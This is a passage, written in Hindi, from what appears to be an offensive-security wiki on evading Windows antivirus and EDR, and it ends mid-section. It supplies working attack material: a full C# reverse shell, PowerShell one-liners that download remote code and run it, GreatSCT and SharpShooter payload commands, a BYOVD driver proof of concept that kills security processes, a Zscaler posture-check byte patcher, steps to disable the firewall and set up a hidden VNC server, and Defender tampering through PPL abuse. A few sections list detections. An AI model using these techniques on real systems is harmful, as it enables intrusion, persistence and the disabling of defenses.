**MoTW** (Mark of The Web) एक [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) है जिसका नाम Zone.Identifier होता है और यह इंटरनेट से फाइलें डाउनलोड करते समय स्वतः बन जाता है, साथ ही उस URL की जानकारी भी शामिल होती है जिससे फाइल डाउनलोड हुई थी।

<figure><img src="../images/image (237).png" alt=""><figcaption><p>इंटरनेट से डाउनलोड की गई फ़ाइल के लिए Zone.Identifier ADS की जाँच।</p></figcaption></figure>

> [!TIP]
> यह ध्यान रखना महत्वपूर्ण है कि ऐसे executables जो **trusted** signing certificate से signed होते हैं, **SmartScreen को trigger नहीं करेंगे**।

आपके payloads को Mark of The Web मिलने से रोकने का एक बहुत प्रभावी तरीका यह है कि उन्हें किसी container जैसे ISO के अंदर पैकेज किया जाए। ऐसा इसलिए होता है क्योंकि Mark-of-the-Web (MOTW) **non NTFS** वॉल्यूम्स पर **apply नहीं** किया जा सकता।

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) एक टूल है जो payloads को output containers में पैकेज करता है ताकि Mark-of-the-Web से बचा जा सके।

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) Windows में एक शक्तिशाली लॉगिंग मैकॅनिज़्म है जो applications और system components को **इवेंट लॉग करने** की अनुमति देता है। हालांकि, इसे security products द्वारा malicious activities की निगरानी और पहचान करने के लिए भी उपयोग किया जा सकता है।

AMSI को कैसे डिसेबल (बायपास) किया जाता है उसी तरह यह भी संभव है कि user space process का **`EtwEventWrite`** function किसी भी इवेंट को लॉग किए बिना तुरंत return कर दे। यह memory में function को patch करके तुरंत return करवा कर किया जाता है, जिससे उस process के लिए ETW logging प्रभावी रूप से अक्षम हो जाता है।

अधिक जानकारी के लिए देखें **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

C# बाइनरीज़ को memory में लोड करना काफी समय से जाना जाता है और यह अब भी post-exploitation टूल्स को AV से पकड़े बिना चलाने का एक बहुत अच्छा तरीका है।

चूंकि payload सीधे memory में लोड होगा बिना disk को छुए, इसलिए हमें पूरे process के लिए केवल AMSI को patch करने की चिंता करनी होगी।

अधिकांश C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, आदि) पहले से ही C# assemblies को सीधे memory में execute करने की क्षमता प्रदान करते हैं, लेकिन इसे करने के अलग-अलग तरीके हैं:

- **Fork\&Run**

इसमें एक नया sacrificial process spawn करना शामिल है, उस नए process में अपना post-exploitation malicious code inject करना, अपना malicious code execute करना और समाप्त होने पर नए process को kill कर देना। इसके फायदे और नुकसान दोनों हैं। fork and run मेथड का फायदा यह है कि execution हमारे Beacon implant process के **बाहर** होता है। इसका मतलब है कि अगर हमारी post-exploitation action में कुछ गलत होता है या पकड़ा जाता है, तो हमारी implant के जीवित रहने की **काफी अधिक संभावना** रहती है। नुकसान यह है कि Behavioural Detections द्वारा पकड़े जाने की **अधिक संभावना** रहती है।

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

यह अपने post-exploitation malicious code को **अपने ही process में** inject करने के बारे में है। इस तरह, आप नया process बनाने और उसे AV द्वारा स्कैन किए जाने से बच सकते हैं, लेकिन नुकसान यह है कि यदि आपके payload के execution में कुछ गलत होता है, तो आपके beacon को खोने की **काफ़ी अधिक संभावना** रहती है क्योंकि यह crash कर सकता है।

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> यदि आप C# Assembly loading के बारे में और पढ़ना चाहते हैं, तो यह article देखें [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) और उनका InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

आप C# Assemblies को **PowerShell** से भी लोड कर सकते हैं, देखें [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) और [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), यह संभव है कि compromised machine को access देकर अन्य भाषाओं का उपयोग करके malicious code execute किया जाए **to the interpreter environment installed on the Attacker Controlled SMB share**.

SMB share पर Interpreter Binaries और environment तक पहुँच की अनुमति देकर आप compromised machine की memory में इन भाषाओं में **arbitrary code execute कर सकते हैं**।

Repo का संकेत है: Defender अभी भी scripts को scan करता है लेकिन Go, Java, PHP आदि का उपयोग करके हमारे पास **static signatures को बायपास करने की अधिक लचीलापन** होता है। इन भाषाओं में random un-obfuscated reverse shell scripts के साथ परीक्षण सफल साबित हुआ है।

## TokenStomping

Token stomping एक तकनीक है जो attacker को access token या EDR/AV जैसे security product को **manipulate** करने की अनुमति देती है, जिससे वे इसके privileges को कम कर सकते हैं ताकि process न मरे पर उसे malicious activities की जाँच करने की permissions न हों।

इसे रोकने के लिए Windows **बाहरी processes को रोक** सकता है ताकि वे security processes के tokens पर handles न प्राप्त कर सकें।

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

जैसा कि [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) में वर्णित है, पीड़ित के PC में Chrome Remote Desktop को तैनात करना और फिर उसे takeover कर persistence बनाए रखना आसान है:
1. https://remotedesktop.google.com/ से डाउनलोड करें, "Set up via SSH" पर क्लिक करें, और फिर Windows के लिए MSI फ़ाइल डाउनलोड करने के लिए MSI फ़ाइल पर क्लिक करें।
2. पीड़ित पर इंस्टॉलर को silent में चलाएँ (admin आवश्यक): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop पेज पर वापस जाएँ और next पर क्लिक करें। विज़ार्ड आपसे authorize करने के लिए कहेगा; जारी रखने के लिए Authorize बटन पर क्लिक करें।
4. दिए गए parameter को कुछ समायोजन के साथ execute करें: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (ध्यान दें pin param जो GUI का उपयोग किए बिना pin सेट करने की अनुमति देता है)।

## Advanced Evasion

Evasion एक बहुत जटिल विषय है, कभी-कभी आपको केवल एक सिस्टम में कई अलग-अलग telemetry स्रोतों को ध्यान में रखना पड़ता है, इसलिए परिपक्व वातावरणों में पूरी तरह अप्रकाशित रहना लगभग असंभव है।

हर वातावरण के अपने strengths और weaknesses होंगे।

मैं दृढ़ता से सुझाव देता हूँ कि आप [@ATTL4S](https://twitter.com/DaniLJ94) का यह talk देखें, ताकि Advanced Evasion techniques में और पकड़ बने।

{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

यह [@mariuszbit](https://twitter.com/mariuszbit) का एक और शानदार talk है जो Evasion in Depth के बारे में है।

{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **जांचे कि Defender किन हिस्सों को malicious पाता है**

आप [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) का उपयोग कर सकते हैं जो बाइनरी के हिस्सों को **हटा देगा** जब तक कि यह **पता न लगा ले कि Defender** किस हिस्से को malicious मान रहा है और आपको उसे अलग कर दे।\
एक और टूल जो वही काम करता है वह है [**avred**](https://github.com/dobin/avred) जिसकी वेब सर्विस [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) पर उपलब्ध है।

### **Telnet Server**

Windows 10 तक, सभी Windows के साथ एक **Telnet server** आता था जिसे आप (administrator के रूप में) इंस्टॉल कर सकते थे, करते हुए:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
इसे सिस्टम शुरू होने पर **start** कराएँ और इसे अभी **run** करें:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet पोर्ट बदलें** (stealth) और firewall अक्षम करें:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (आपको bin downloads चाहिए, setup नहीं)

**ON THE HOST**: _**winvnc.exe**_ को चलाएँ और सर्वर कॉन्फ़िगर करें:

- विकल्प _Disable TrayIcon_ को सक्षम करें
- _VNC Password_ में पासवर्ड सेट करें
- _View-Only Password_ में पासवर्ड सेट करें

फिर, बाइनरी _**winvnc.exe**_ और **नए** बनाए गए फ़ाइल _**UltraVNC.ini**_ को **victim** के अंदर रखें

#### **Reverse connection**

The **attacker** को अपने **host** पर बाइनरी `vncviewer.exe -listen 5900` चलानी चाहिए ताकि यह रिवर्स **VNC connection** पकड़ने के लिए तैयार रहे। फिर, **victim** के अंदर: winvnc daemon `winvnc.exe -run` शुरू करें और चलाएँ `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Stealth बनाए रखने के लिए आपको कुछ चीजें नहीं करनी चाहिए

- यदि `winvnc` पहले से चल रहा है तो इसे शुरू न करें अन्यथा आप एक [popup](https://i.imgur.com/1SROTTl.png) ट्रिगर कर देंगे। जांचें कि यह चल रहा है या नहीं: `tasklist | findstr winvnc`
- उसी डायरेक्टरी में `UltraVNC.ini` के बिना `winvnc` शुरू न करें अन्यथा यह [the config window](https://i.imgur.com/rfMQWcf.png) खोल देगा
- मदद के लिए `winvnc -h` न चलाएँ अन्यथा आप एक [popup](https://i.imgur.com/oc18wcu.png) ट्रिगर कर देंगे

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT के अंदर:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
अब `msfconsole -r file.rc` के साथ **लिस्टर शुरू करें** और **xml payload** को **निष्पादित करें**:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Current defender प्रक्रिया को बहुत तेज़ी से समाप्त कर देगा।**

### हमारा अपना reverse shell कम्पाइल करना

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### पहला C# Revershell

इसे कम्पाइल करें:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
इसे इनके साथ उपयोग करें:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using कंपाइलर
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

स्वचालित डाउनलोड और निष्पादन:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators सूची: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### build injectors उदाहरण के लिए python का उपयोग:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### अन्य टूल
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### और

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 ने एक छोटे से कंसोल यूटिलिटी का उपयोग किया जिसे **Antivirus Terminator** कहा जाता है ताकि ransomware गिराने से पहले endpoint protections को अक्षम किया जा सके। यह टूल अपना **own vulnerable but *signed* driver** लाता है और इसे मिसयूज़ करके privileged kernel operations करता है जिन्हें Protected-Process-Light (PPL) AV सेवाएँ भी ब्लॉक नहीं कर पातीं।

मुख्य बातें
1. **Signed driver**: डिस्क पर डिलीवर की गई फ़ाइल `ServiceMouse.sys` है, लेकिन बाइनरी वास्तव में Antiy Labs के “System In-Depth Analysis Toolkit” का वैध रूप से साइन किया गया ड्राइवर `AToolsKrnl64.sys` है। चूँकि ड्राइवर पर वैध Microsoft सिग्नेचर है, यह Driver-Signature-Enforcement (DSE) सक्षम होने पर भी लोड हो जाता है।
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
पहली लाइन ड्राइवर को एक **kernel service** के रूप में रजिस्टर करती है और दूसरी लाइन इसे स्टार्ट करती है ताकि `\\.\ServiceMouse` user land से एक्सेसिबल हो जाए।
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | किसी भी PID द्वारा arbitrary process को terminate करना (Defender/EDR सेवाओं को मारने के लिए उपयोग किया गया) |
| `0x990000D0` | डिस्क पर किसी भी arbitrary फ़ाइल को delete करना |
| `0x990001D0` | ड्राइवर को अनलोड करना और सर्विस को हटाना |

न्यूनतम C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD user-mode सुरक्षा को पूरी तरह स्किप कर देता है; वह कोड जो kernel में execute होता है protected processes को खोल सकता है, उन्हें terminate कर सकता है, या kernel objects के साथ छेड़छाड़ कर सकता है, चाहे PPL/PP, ELAM या अन्य hardening फीचर्स मौजूद क्यों न हों।

डिटेक्शन / निवारण
•  Microsoft की vulnerable-driver ब्लॉक सूची (`HVCI`, `Smart App Control`) सक्षम करें ताकि Windows `AToolsKrnl64.sys` को लोड करने से इनकार करे।  
•  नए *kernel* सेवाओं के निर्माण की निगरानी करें और अलर्ट करें जब कोई ड्राइवर world-writable डायरेक्टरी से लोड हो या allow-list में मौजूद न हो।  
•  कस्टम device objects के लिए user-mode हैंडल और उसके बाद संदिग्ध `DeviceIoControl` कॉल्स पर नज़र रखें।

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** डिवाइस-पोस्टर नियमों को स्थानीय रूप से लागू करता है और परिणामों को अन्य कम्पोनेंट्स तक पहुँचाने के लिए Windows RPC पर निर्भर करता है। दो कमजोर डिज़ाइन विकल्प एक पूर्ण bypass को संभव बनाते हैं:

1. Posture evaluation पूरी तरह **entirely client-side** होती है (एक boolean सर्वर को भेजा जाता है)।  
2. Internal RPC endpoints केवल यह मान्य करते हैं कि कनेक्ट करने वाला executable **signed by Zscaler** है (via `WinVerifyTrust`)।

डिस्क पर मौजूद चार signed बाइनरीज़ को पैच करके दोनों मेकानिज़्म को neutralise किया जा सकता है:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | हमेशा `1` लौटाता है इसलिए हर चेक अनुपालन दिखता है |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ कोई भी (यहाँ तक कि unsigned) प्रक्रिया RPC पाइप्स से bind कर सकती है |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` से प्रतिस्थापित |
| `ZSATunnel.exe` | Integrity checks on the tunnel | शॉर्ट-सर्किट कर दिया गया |

न्यूनतम पैचर का अंश:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
After replacing the original files and restarting the service stack:

* **सभी** posture checks display **green/compliant**।
* Unsigned या modified binaries named-pipe RPC endpoints खोल सकते हैं (e.g. `\\RPC Control\\ZSATrayManager_talk_to_me`)।
* The compromised host Zscaler नीतियों द्वारा परिभाषित internal network तक unrestricted access प्राप्त कर लेता है।

यह case study दिखाती है कि कैसे purely client-side trust decisions और simple signature checks कुछ byte patches के साथ पराजित किए जा सकते हैं।

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) एक signer/level hierarchy लागू करता है ताकि केवल equal-or-higher protected processes ही एक-दूसरे में tamper कर सकें। Offensive दृष्टिकोण से, यदि आप वैध रूप से एक PPL-enabled binary लॉन्च कर सकते हैं और उसके arguments नियंत्रित कर सकते हैं, तो आप benign functionality (e.g., logging) को एक constrained, PPL-backed write primitive में बदल सकते हैं जो AV/EDR द्वारा उपयोग किए जाने वाले protected directories के खिलाफ काम करता है।

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- उपयोग का पैटर्न:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- साइन किए गए सिस्टम बाइनरी `C:\Windows\System32\ClipUp.exe` स्वयं स्पॉन होती है और कॉलर-निर्दिष्ट पाथ पर लॉग फ़ाइल लिखने के लिए एक पैरामीटर स्वीकार करती है।
- जब इसे PPL प्रोसेस के रूप में लॉन्च किया जाता है, तो फ़ाइल लिखाई PPL बैकिंग के साथ होती है।
- ClipUp स्पेस वाले पाथ्स को पार्स नहीं कर सकता; सामान्यतः सुरक्षित लोकेशन्स में पॉइंट करने के लिए 8.3 शॉर्ट पाथ्स का उपयोग करें।

8.3 short path helpers
- शॉर्ट नाम सूचीबद्ध करें: `dir /x` प्रत्येक parent डायरेक्टरी में।
- cmd में शॉर्ट पाथ निकालें: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) PPL-capable LOLBIN (ClipUp) को `CREATE_PROTECTED_PROCESS` के साथ किसी लॉन्चर (e.g., CreateProcessAsPPL) का उपयोग करके लॉन्च करें।
2) ClipUp के लॉग-पाथ आर्गुमेंट को पास करें ताकि किसी प्रोटेक्टेड AV डायरेक्टरी (e.g., Defender Platform) में फ़ाइल क्रिएशन मजबूर हो सके। आवश्यकता पड़ने पर 8.3 शॉर्ट नामों का उपयोग करें।
3) अगर टारगेट बाइनरी सामान्यतः AV द्वारा रन के समय ओपन/लॉक रहती है (e.g., MsMpEng.exe), तो AV शुरू होने से पहले बूट पर लिखाई शेड्यूल करने के लिए एक auto-start service इंस्टॉल करें जो भरोसेमंद रूप से पहले चले। Process Monitor (boot logging) के साथ बूट ऑर्डरिंग वैरिफाई करें।
4) रीबूट पर PPL-समर्थित लिखाई AV के बाइनरी लॉक करने से पहले होती है, जिससे टारगेट फ़ाइल करप्ट हो जाती है और स्टार्टअप रोका जाता है।

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
नोट्स और सीमाएँ
- आप ClipUp द्वारा लिखी जाने वाली सामग्री के contents को केवल उसके placement के अलावा नियंत्रित नहीं कर सकते; यह primitive सटीक कंटेंट इंजेक्शन के बजाय भ्रष्ट करने (corruption) के लिए उपयुक्त है।
- सेवा को install/start करने तथा reboot की विंडो के लिए स्थानीय admin/SYSTEM की आवश्यकता होती है।
- समय महत्वपूर्ण है: target खुला नहीं होना चाहिए; boot-time execution फ़ाइल लॉक से बचाता है।

डिटेक्शंस
- Boot के आसपास असामान्य arguments के साथ `ClipUp.exe` की process creation, खासकर non-standard launchers द्वारा parent होने पर।
- नए services जो suspicious binaries को auto-start के लिए configure किए गए हों और लगातार Defender/AV से पहले शुरू हों। Defender startup failures से पहले service creation/modification की जाँच करें।
- Defender binaries/Platform निर्देशिकाओं पर file integrity monitoring; protected-process flags वाले processes द्वारा असामान्य file creations/modifications।
- ETW/EDR telemetry: `CREATE_PROTECTED_PROCESS` के साथ बनाए गए processes और non-AV binaries द्वारा असामान्य PPL स्तर के उपयोग की तलाश करें।

रोकथाम
- WDAC/Code Integrity: यह सीमित करें कि कौन से signed binaries PPL के रूप में चल सकते हैं और किन parents के तहत; legitimate contexts के बाहर ClipUp invocation को ब्लॉक करें।
- Service hygiene: auto-start services के creation/modification को प्रतिबंधित करें और start-order manipulation पर निगरानी रखें।
- Defender tamper protection और early-launch protections सक्षम सुनिश्चित करें; बाइनरी करप्शन का संकेत देने वाली startup errors की जाँच करें।
- यदि आपके वातावरण के अनुकूल हो तो security tooling होस्ट करने वाले वॉल्यूम्स पर 8.3 short-name generation को अक्षम करने पर विचार करें (ठीक से टेस्ट करें)।

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Microsoft Defender में Platform Version Folder Symlink Hijack के माध्यम से छेड़छाड़

Windows Defender उस Platform को चुनता है जहाँ से वह चलता है, निम्नलिखित subfolders को enumerate करके:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

यह lexicographic रूप से सबसे उच्च version string (उदा., `4.18.25070.5-0`) वाला subfolder चुनता है, फिर वहाँ से Defender service processes को शुरू करता है (अनुसार service/registry paths को अपडेट करते हुए)। यह चयन directory entries पर भरोसा करता है, जिनमें directory reparse points (symlinks) भी शामिल हैं। एक administrator इसका लाभ उठा कर Defender को attacker-writable path पर redirect कर सकता है और DLL sideloading या service disruption हासिल कर सकता है।

पूर्व शर्तें
